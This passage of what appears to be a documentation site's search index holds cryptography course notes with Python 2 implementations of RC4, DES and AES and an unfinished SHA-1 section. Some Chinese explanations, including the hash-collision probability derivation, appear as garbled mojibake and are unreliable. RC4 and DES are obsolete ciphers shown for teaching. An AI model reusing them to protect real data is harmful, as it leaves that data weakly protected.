is: $$\\displaystyle \\begin{cases} f_1(x) = x^{19} + x^5 + x^2 + x + 1 \\ f_2(x) = x^{22} + x + 1 \\ f_3(x) = x^{23} + x^{16} + x^2 + x +1 \\end{cases}$$\n  Tap positions: $$d_1 = 11, d_2 = 12, d_3 = 13$$.\n  Majority function.\n  LFSR working flow:\nKIA phase:\n For session key $$K = (k_0, \\cdots, k_{63})$$, and a frame counter number $$N = (n_0, \\cdots, n_{21})$$. Let S be the concatenation of K and N. ï¼ˆè¿™é‡Œè¿˜æœ‰ï¼Œæ‡’å¾—å†™äº†ï¼‰  A5/1 is very weak. (Weakness: short period, majority rule, short key length.)\nE0 in Bluetooth #  RC4 in WEP #  WEP:\n The wire equivalent privacy (WEP) algorithm is used to protect wireless communication from eavesdropping; prevent unauthorized access to a wireless network.  KIA phase pseudocodeï¼š\nKIA(K)\rInitialization:\rfor i in range(2^n):\rS[i] = i\rScrambling:\rj = 0\rfor i in range(2^n):\rj = j + S[i] + K[i % l]\rswap(S[i], S[j]) PRSG phase pseudocode:\nPRSG(S):\rInitialization:\ri =0, j = 0\rGeneration Loop:\ri = i+1\rj = j + S[i]\rswap(S[i], S[j])\rt = (S[i] + S[j]) mod N\ryield S[t] Implement in python from github:\n#!/usr/bin/env python  def KSA(key):  keylength = len(key)   S = range(256)   j = 0  for i in range(256):  j = (j + S[i] + key[i % keylength]) % 256  S[i], S[j] = S[j], S[i] # swap   return S   def PRGA(S):  i = 0  j = 0  while True:  i = (i + 1) % 256  j = (j + S[i]) % 256  S[i], S[j] = S[j], S[i] # swap   K = S[(S[i] + S[j]) % 256]  yield K   def RC4(key):  S = KSA(key)  return PRGA(S)  if __name__ == \u0026#39;__main__\u0026#39;:  # test vectors are from http://en.wikipedia.org/wiki/RC4   # ciphertext should be BBF316E8D940AF0AD3  key = \u0026#39;Key\u0026#39;  plaintext = \u0026#39;Plaintext\u0026#39;   # ciphertext should be 1021BF0420  #key = \u0026#39;Wiki\u0026#39;  #plaintext = \u0026#39;pedia\u0026#39;   # ciphertext should be 45A01F645FC35B383552544B9BF5  #key = \u0026#39;Secret\u0026#39;  #plaintext = \u0026#39;Attack at dawn\u0026#39;   def convert_key(s):  return [ord(c) for c in s]  key = convert_key(key)   keystream = RC4(key)   import sys  for c in plaintext:  sys.stdout.write(\u0026#34;%02X\u0026#34; % (ord(c) ^ keystream.next()))  print PRSG phase can be illustrated by the following state transition graph:\nWG Stream Cipher #  The WG stream cipher can be explained as following formula:\n  Initialize $$a_0, \\cdots, a_l$$ with given key with l length.\n  Updating: $$\\displaystyle a_{k+l} = \\begin{cases}\\displaystyle \\sum_{i=0}^{l-1}c_i a_{i+k} + WGperm(a_{k+l-1}) \u0026amp; 0 \\le k \u0026lt; 2l,\u0026amp; \\text{KIA phase} \\ \\displaystyle \\sum_{i=0}^{l-1} c_i a_{i+k} \u0026amp; k \\ge 2l, \u0026amp; \\text{running phase}\\end{cases}$$\n  Output: $$s_k = WG(a_{k +2l + l-1})$$\n  Cipher flow:\n"},{"id":351,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.1.blockciphers/","title":"4.1. Block Ciphers","section":"4.Block-Hash-MAC","content":"Block Cipher #  Overview #  property:\n Diffusion: any bits from the input message should affect whole cipher text. Confusion: with different key, the cipher message should be completely different.  å—åŠ å¯†å¯ä»¥ç”¨ä»¥ä¸‹ä¸€ä¸ªå‡½æ•°è¡¨ç¤ºï¼š$$C = E_k(x) = f(x, k), x,k,C \\in \\mathbb{F}_2^{(n)}$$\nRequirements of f:\n Nonelinearity: a minimum distance between f and all the linear, affine functions (confusion). Resist linear cryptanalysis. Strict Avalanche Criterion(SAC): One bit change, resulting in significant changes (diffusion). Resist differential cryptanalysis.  Structure of block ciphers:\n  Feistel structure, which is an NLFSR (nonlinear feedback shift register) with input.\n  Substitute permutation network (SPN) structure\n  Data encryption standard (DES) #  DES: Data Encryption Standard, NIST, 1976.\nPython code: github:\n#-*- coding: utf8 -*-  #Initial permut matrix for the datas PI = [58, 50, 42, 34, 26, 18, 10, 2,  60, 52, 44, 36, 28, 20, 12, 4,  62, 54, 46, 38, 30, 22, 14, 6,  64, 56, 48, 40, 32, 24, 16, 8,  57, 49, 41, 33, 25, 17, 9, 1,  59, 51, 43, 35, 27, 19, 11, 3,  61, 53, 45, 37, 29, 21, 13, 5,  63, 55, 47, 39, 31, 23, 15, 7]  #Initial permut made on the key CP_1 = [57, 49, 41, 33, 25, 17, 9,  1, 58, 50, 42, 34, 26, 18,  10, 2, 59, 51, 43, 35, 27,  19, 11, 3, 60, 52, 44, 36,  63, 55, 47, 39, 31, 23, 15,  7, 62, 54, 46, 38, 30, 22,  14, 6, 61, 53, 45, 37, 29,  21, 13, 5, 28, 20, 12, 4]  #Permut applied on shifted key to get Ki+1 CP_2 = [14, 17, 11, 24, 1, 5, 3, 28,  15, 6, 21, 10, 23, 19, 12, 4,  26, 8, 16, 7, 27, 20, 13, 2,  41, 52, 31, 37, 47, 55, 30, 40,  51, 45, 33, 48, 44, 49, 39, 56,  34, 53, 46, 42, 50, 36, 29, 32]  #Expand matrix to get a 48bits matrix of datas to apply the xor with Ki E = [32, 1, 2, 3, 4, 5,  4, 5, 6, 7, 8, 9,  8, 9, 10, 11, 12, 13,  12, 13, 14, 15, 16, 17,  16, 17, 18, 19, 20, 21,  20, 21, 22, 23, 24, 25,  24, 25, 26, 27, 28, 29,  28, 29, 30, 31, 32, 1]  #SBOX S_BOX = [  [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],  [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],  [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],  [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13], ],  [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10],  [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5],  [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15],  [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9], ],  [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8],  [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1],  [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7],  [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12], ],  [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15],  [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9],  [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4],  [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14], ],  [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9],  [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6],  [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14],  [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3], ],  [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11],  [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8],  [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6],  [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13], ],  [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1],  [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6],  [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2],  [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12], ],  [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7],  [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2],  [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8],  [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11], ] ]  #Permut made after each SBox substitution for each round P = [16, 7, 20, 21, 29, 12, 28, 17,  1, 15, 23, 26, 5, 18, 31, 10,  2, 8, 24, 14, 32, 27, 3, 9,  19, 13, 30, 6, 22, 11, 4, 25]  #Final permut for datas after the 16 rounds PI_1 = [40, 8, 48, 16, 56, 24, 64, 32,  39, 7, 47, 15, 55, 23, 63, 31,  38, 6, 46, 14, 54, 22, 62, 30,  37, 5, 45, 13, 53, 21, 61, 29,  36, 4, 44, 12, 52, 20, 60, 28,  35, 3, 43, 11, 51, 19, 59, 27,  34, 2, 42, 10, 50, 18, 58, 26,  33, 1, 41, 9, 49, 17, 57, 25]  #Matrix that determine the shift for each round of keys SHIFT = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]  def string_to_bit_array(text):#Convert a string into a list of bits  array = list()  for char in text:  binval = binvalue(char, 8)#Get the char value on one byte  array.extend([int(x) for x in list(binval)]) #Add the bits to the final list  return array  def bit_array_to_string(array): #Recreate the string from the bit array  res = \u0026#39;\u0026#39;.join([chr(int(y,2)) for y in [\u0026#39;\u0026#39;.join([str(x) for x in _bytes]) for _bytes in nsplit(array,8)]])  return res  def binvalue(val, bitsize): #Return the binary value as a string of the given size   binval = bin(val)[2:] if isinstance(val, int) else bin(ord(val))[2:]  if len(binval) \u0026gt; bitsize:  raise \u0026#34;binary value larger than the expected size\u0026#34;  while len(binval) \u0026lt; bitsize:  binval = \u0026#34;0\u0026#34;+binval #Add as many 0 as needed to get the wanted size  return binval  def nsplit(s, n):#Split a list into sublists of size \u0026#34;n\u0026#34;  return [s[k:k+n] for k in range(0, len(s), n)]  ENCRYPT=1 DECRYPT=0  class des():  def __init__(self):  self.password = None  self.text = None  self.keys = list()   def run(self, key, text, action=ENCRYPT, padding=False):  if len(key) \u0026lt; 8:  raise \u0026#34;Key Should be 8 bytes long\u0026#34;  elif len(key) \u0026gt; 8:  key = key[:8] #If key size is above 8bytes, cut to be 8bytes long   self.password = key  self.text = text   if padding and action==ENCRYPT:  self.addPadding()  elif len(self.text) % 8 != 0:#If not padding specified data size must be multiple of 8 bytes  raise \u0026#34;Data size should be multiple of 8\u0026#34;   self.generatekeys() #Generate all the keys  text_blocks = nsplit(self.text, 8) #Split the text in blocks of 8 bytes so 64 bits  result = list()  for block in text_blocks:#Loop over all the blocks of data  block = string_to_bit_array(block)#Convert the block in bit array  block = self.permut(block,PI)#Apply the initial permutation  g, d = nsplit(block, 32) #g(LEFT), d(RIGHT)  tmp = None  for i in range(16): #Do the 16 rounds  d_e = self.expand(d, E) #Expand d to match Ki size (48bits)  if action == ENCRYPT:  tmp = self.xor(self.keys[i], d_e)#If encrypt use Ki  else:  tmp = self.xor(self.keys[15-i], d_e)#If decrypt start by the last key  tmp = self.substitute(tmp) #Method that will apply the SBOXes  tmp = self.permut(tmp, P)  tmp = self.xor(g, tmp)  g = d  d = tmp  result += self.permut(d+g, PI_1) #Do the last permut and append the result to result  final_res = bit_array_to_string(result)  if padding and action==DECRYPT:  return self.removePadding(final_res) #Remove the padding if decrypt and padding is true  else:  return final_res #Return the final string of data ciphered/deciphered   def substitute(self, d_e):#Substitute bytes using SBOX  subblocks = nsplit(d_e, 6)#Split bit array into sublist of 6 bits  result = list()  for i in range(len(subblocks)): #For all the sublists  block = subblocks[i]  row = int(str(block[0])+str(block[5]),2)#Get the row with the first and last bit  column = int(\u0026#39;\u0026#39;.join([str(x) for x in block[1:][:-1]]),2) #Column is the 2,3,4,5th bits  val = S_BOX[i][row][column] #Take the value in the SBOX appropriated for the round (i)  bin = binvalue(val, 4)#Convert the value to binary  result += [int(x) for x in bin]#And append it to the resulting list  return result   def permut(self, block, table):#Permut the given block using the given table (so generic method)  return [block[x-1] for x in table]   def expand(self, block, table):#Do the exact same thing than permut but for more clarity has been renamed  return [block[x-1] for x in table]   def xor(self, t1, t2):#Apply a xor and return the resulting list  return [x^y for x,y in zip(t1,t2)]   def generatekeys(self):#Algorithm that generates all the keys  self.keys = []  key = string_to_bit_array(self.password)  key = self.permut(key, CP_1) #Apply the initial permut on the key  g, d = nsplit(key, 28) #Split it in to (g-\u0026gt;LEFT),(d-\u0026gt;RIGHT)  for i in range(16):#Apply the 16 rounds  g, d = self.shift(g, d, SHIFT[i]) #Apply the shift associated with the round (not always 1)  tmp = g + d #Merge them  self.keys.append(self.permut(tmp, CP_2)) #Apply the permut to get the Ki   def shift(self, g, d, n): #Shift a list of the given value  return g[n:] + g[:n], d[n:] + d[:n]   def addPadding(self):#Add padding to the datas using PKCS5 spec.  pad_len = 8 - (len(self.text) % 8)  self.text += pad_len * chr(pad_len)   def removePadding(self, data):#Remove the padding of the plain text (it assume there is padding)  pad_len = ord(data[-1])  return data[:-pad_len]   def encrypt(self, key, text, padding=False):  return self.run(key, text, ENCRYPT, padding)   def decrypt(self, key, text, padding=False):  return self.run(key, text, DECRYPT, padding)  if __name__ == \u0026#39;__main__\u0026#39;:  key = \u0026#34;secret_k\u0026#34;  text= \u0026#34;Hello wo\u0026#34;  d = des()  r = d.encrypt(key,text)  r2 = d.decrypt(key,r)  print(\u0026#34;Ciphered: %r\u0026#34; % r)  print(\u0026#34;Deciphered: \u0026#34;, r2) Advanced Encryption Standard (AES) #  AES: Advanced Encryption Standard\nPython code github:\n#!/usr/bin/env python   \u0026#34;\u0026#34;\u0026#34; Copyright (C) 2012 Bo Zhu http://about.bozhu.me Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \u0026#34;Software\u0026#34;), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \u0026#34;AS IS\u0026#34;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. \u0026#34;\u0026#34;\u0026#34;  Sbox = (  0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,  0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,  0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,  0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,  0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,  0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,  0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,  0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,  0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,  0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,  0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,  0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,  0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,  0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,  0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,  0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, )  InvSbox = (  0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,  0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,  0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,  0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,  0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,  0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,  0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,  0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,  0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,  0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,  0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,  0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,  0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,  0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,  0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,  0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D, )   # learnt from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.c xtime = lambda a: (((a \u0026lt;\u0026lt; 1) ^ 0x1B) \u0026amp; 0xFF) if (a \u0026amp; 0x80) else (a \u0026lt;\u0026lt; 1)   Rcon = (  0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,  0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,  0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,  0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39, )   def text2matrix(text):  matrix = []  for i in range(16):  byte = (text \u0026gt;\u0026gt; (8 * (15 - i))) \u0026amp; 0xFF  if i % 4 == 0:  matrix.append([byte])  else:  matrix[i / 4].append(byte)  return matrix   def matrix2text(matrix):  text = 0  for i in range(4):  for j in range(4):  text |= (matrix[i][j] \u0026lt;\u0026lt; (120 - 8 * (4 * i + j)))  return text   class AES:  def __init__(self, master_key):  self.change_key(master_key)   def change_key(self, master_key):  self.round_keys = text2matrix(master_key)  # print self.round_keys   for i in range(4, 4 * 11):  self.round_keys.append([])  if i % 4 == 0:  byte = self.round_keys[i - 4][0] \\  ^ Sbox[self.round_keys[i - 1][1]] \\  ^ Rcon[i / 4]  self.round_keys[i].append(byte)   for j in range(1, 4):  byte = self.round_keys[i - 4][j] \\  ^ Sbox[self.round_keys[i - 1][(j + 1) % 4]]  self.round_keys[i].append(byte)  else:  for j in range(4):  byte = self.round_keys[i - 4][j] \\  ^ self.round_keys[i - 1][j]  self.round_keys[i].append(byte)   # print self.round_keys   def encrypt(self, plaintext):  self.plain_state = text2matrix(plaintext)   self.__add_round_key(self.plain_state, self.round_keys[:4])   for i in range(1, 10):  self.__round_encrypt(self.plain_state, self.round_keys[4 * i : 4 * (i + 1)])   self.__sub_bytes(self.plain_state)  self.__shift_rows(self.plain_state)  self.__add_round_key(self.plain_state, self.round_keys[40:])   return matrix2text(self.plain_state)   def decrypt(self, ciphertext):  self.cipher_state = text2matrix(ciphertext)   self.__add_round_key(self.cipher_state, self.round_keys[40:])  self.__inv_shift_rows(self.cipher_state)  self.__inv_sub_bytes(self.cipher_state)   for i in range(9, 0, -1):  self.__round_decrypt(self.cipher_state, self.round_keys[4 * i : 4 * (i + 1)])   self.__add_round_key(self.cipher_state, self.round_keys[:4])   return matrix2text(self.cipher_state)   def __add_round_key(self, s, k):  for i in range(4):  for j in range(4):  s[i][j] ^= k[i][j]    def __round_encrypt(self, state_matrix, key_matrix):  self.__sub_bytes(state_matrix)  self.__shift_rows(state_matrix)  self.__mix_columns(state_matrix)  self.__add_round_key(state_matrix, key_matrix)    def __round_decrypt(self, state_matrix, key_matrix):  self.__add_round_key(state_matrix, key_matrix)  self.__inv_mix_columns(state_matrix)  self.__inv_shift_rows(state_matrix)  self.__inv_sub_bytes(state_matrix)   def __sub_bytes(self, s):  for i in range(4):  for j in range(4):  s[i][j] = Sbox[s[i][j]]    def __inv_sub_bytes(self, s):  for i in range(4):  for j in range(4):  s[i][j] = InvSbox[s[i][j]]    def __shift_rows(self, s):  s[0][1], s[1][1], s[2][1], s[3][1] = s[1][1], s[2][1], s[3][1], s[0][1]  s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]  s[0][3], s[1][3], s[2][3], s[3][3] = s[3][3], s[0][3], s[1][3], s[2][3]    def __inv_shift_rows(self, s):  s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1]  s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2]  s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3]   def __mix_single_column(self, a):  # please see Sec 4.1.2 in The Design of Rijndael  t = a[0] ^ a[1] ^ a[2] ^ a[3]  u = a[0]  a[0] ^= t ^ xtime(a[0] ^ a[1])  a[1] ^= t ^ xtime(a[1] ^ a[2])  a[2] ^= t ^ xtime(a[2] ^ a[3])  a[3] ^= t ^ xtime(a[3] ^ u)    def __mix_columns(self, s):  for i in range(4):  self.__mix_single_column(s[i])    def __inv_mix_columns(self, s):  # see Sec 4.1.3 in The Design of Rijndael  for i in range(4):  u = xtime(xtime(s[i][0] ^ s[i][2]))  v = xtime(xtime(s[i][1] ^ s[i][3]))  s[i][0] ^= u  s[i][1] ^= v  s[i][2] ^= u  s[i][3] ^= v   self.__mix_columns(s) "},{"id":352,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.2.hashfunctions/","title":"4.2. Hash Functions","section":"4.Block-Hash-MAC","content":"Hash Functions #  Overview #  A hash function h(x) is a map from n bits to m bits where m\u0026lt;n\nAn output of a hash function is called a message digest or a hash value.\nA hash function should satisfy the following property:\n Collision resistance. Second pre-image resistance. Given x, if the probability to find $$y \\not= x $$ such that $$h(y) = h(x)$$ is negligible, then the function h is called second pre-image resistance. Pre-image resistance. Given z, if the probability to find x such that $$z = h(x)$$ is negligible, then the function h is called pre-image resistance.  å“ˆå¸Œä¸­çš„æ¦‚ç‡è®¡ç®— #   å‚è€ƒï¼šhttps://www.cnblogs.com/fengfenggirl/p/hash_prob.html\n æˆ‘ä»¬å‡è®¾æˆ‘ä»¬éœ€è¦å°† n ä¸ªæ•°å­—æ”¾å…¥å¤§å°ä¸º k çš„å“ˆå¸Œæ¡¶ä¸­ã€‚\næ¯ä¸ªæ¡¶ä¸Šé¡¹çš„æœŸæœ› #  å•ç‹¬å¯¹æ¯ä¸ªé¡¹åˆ†æï¼Œå®ƒè¿›å…¥æ¯ä¸ªæ¡¶çš„æ¦‚ç‡éƒ½æ˜¯ $$\\displaystyle \\frac{1}{k}$$\nå•ç‹¬å¯¹æ¯ä¸ªæ¡¶åˆ†æï¼Œå…±æœ‰ n ä¸ªæ•°å­—ï¼Œå› æ­¤æ¯ä¸ªæ¡¶ä¸Šé¡¹çš„æœŸæœ›ä¸º $$\\displaystyle \\frac{n}{k}$$\nç©ºæ¡¶çš„æœŸæœ›ä¸ªæ•° #  å•ç‹¬å¯¹æ¯ä¸ªæ¡¶åˆ†æï¼Œå¯¹äºä»»æ„ä¸€é¡¹ï¼Œè¯¥é¡¹ä¸è½åœ¨æ¡¶ä¸­çš„æ¦‚ç‡ä¸º $$\\displaystyle 1 - \\frac{1}{k}$$\nå•ç‹¬å¯¹æ¯ä¸ªæ¡¶åˆ†æï¼Œæœ€åå®ƒä¸ä¸ºç©ºçš„æ¦‚ç‡ä¸º $$\\displaystyle (1 - \\frac{1}{k})^n$$\næ‰€ä»¥æ€»å…±ç©ºæ¡¶çš„æœŸæœ›æ˜¯å„ä¸ªæ¡¶ä¸ºç©ºçš„æœŸæœ›ä¹‹å’Œï¼Œå³ç©ºæ¡¶çš„æœŸæœ›ä¸ªæ•°ä¸º $$\\displaystyle C = k (1 - \\frac{1}{k})^n = k ((1 - \\frac{1}{k})^{-k})^{-\\frac{n}{k}}$$\nè€Œè‹¥æˆ‘ä»¬å‡è®¾ k è¶³å¤Ÿå¤§ï¼ˆåœ¨ Hash é‡Œé¢ï¼Œè¿™ä¸ªæ•°å­—éšæ¯”ç‰¹å¹‚çº§å¢é•¿ï¼‰ï¼š$$\\displaystyle C = k (\\lim_{k \\rightarrow \\infin} (1 - \\frac{1}{k})^{-k})^{-\\frac{n}{k}} = ke^{-\\frac{n}{k}}$$\nå†²çªçš„æœŸæœ›æ¬¡æ•° #  æˆ‘ä»¬çŸ¥é“ï¼š$$å†²çªçš„æœŸæœ›æ¬¡æ•° = n - æœ€åå ç”¨çš„æ¡¶æ•°$$ï¼Œè€Œ $$æœ€åå ç”¨çš„æ¡¶æ•° = k - æœ€åç©ºæ¡¶çš„æ•°é‡$$ã€‚\nå› æ­¤æˆ‘ä»¬çŸ¥é“ $$å†²çªçš„æœŸæœ›æ¬¡æ•° = n - (k - ke^{-\\frac{n}{k}})$$\nä¸å‘ç”Ÿå†²çªçš„æ¦‚ç‡ #  SHA-1 #  Python code github:\n#!/usr/bin/env python  from __future__ import print_function import struct import io  try:  range = xrange except NameError:  pass   def _left_rotate(n, b):  \u0026#34;\u0026#34;\u0026#34;Left rotate a 32-bit integer n by b bits.\u0026#34;\u0026#34;\u0026#34;  return ((n \u0026lt;\u0026lt; b) | (n \u0026gt;\u0026gt; (32 - b))) \u0026amp; 